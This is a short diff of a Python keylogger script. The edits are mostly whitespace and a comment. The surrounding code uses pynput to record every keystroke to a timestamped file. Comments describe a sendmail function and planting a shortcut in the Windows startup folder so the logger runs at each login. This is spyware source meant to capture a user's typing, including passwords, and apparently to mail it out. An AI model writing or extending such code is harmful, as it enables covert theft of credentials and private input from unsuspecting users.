@@ -1,4 +1,4 @@
-#first import all necessary packages
+# first import all necessary packages
 from pynput.keyboard import Key, Listener
 import os
 import shutil
@@ -24,12 +24,14 @@ source = os.listdir() #gives list of files in current directory
 dateAndtime = datetime.datetime.now().strftime("-%Y-%m-%d-%H-%M-%S")
 #now save filename with the datetime and also mention the temp folder path
 filename = save+"\key_log"+dateAndtime+".txt"
-open(filename,"w+")#w+ use to create the file which does not exist, creates a new file for writing.
-keys=[]#use this list to store the keyboard inputs
+open(filename,"w+") #w+ use to create the file which does not exist, creates a new file for writing.
+keys=[] #use this list to store the keyboard inputs
 count = 0 #used for Enther into sendmail function
 countInternet = 0
 word = "Key."#use to match with keyboards keys
 username = os.getlogin() #looks for current username
+
+# started working on new version 2021
 
 # now first we have to create shortcut of file and store into windows startup folder
 # so first create a destination path
